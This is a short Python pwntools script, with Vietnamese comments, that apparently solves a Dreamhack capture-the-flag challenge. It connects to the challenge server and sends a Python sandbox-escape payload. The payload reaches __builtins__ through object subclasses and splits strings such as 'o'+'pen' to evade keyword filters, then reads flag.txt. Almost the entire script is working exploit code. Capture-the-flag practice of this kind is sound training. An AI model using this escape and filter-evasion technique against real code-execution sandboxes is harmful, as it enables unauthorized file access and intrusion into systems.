from pwn import *

host = "host8.dreamhack.games"
port = 18211

p = remote(host, port)

p.recvuntil(b"Input code > ")

# Payload tấn công, sử dụng DirEntry (index 144) làm điểm khởi đầu
attack_payload = f"print(().__class__.__base__.__subclasses__()[144].__init__.__globals__['__builtins__']['o'+'pen']('f'+'lag.txt').__getattribute__('r'+'ead')(), file=sys.stderr)"

p.sendline(attack_payload.encode())

print("[*] Waiting for the flag...")
# Nhận và in flag
flag = p.recvall().decode()
print("\n[+] FLAG FOUND: " + flag.strip())

p.close()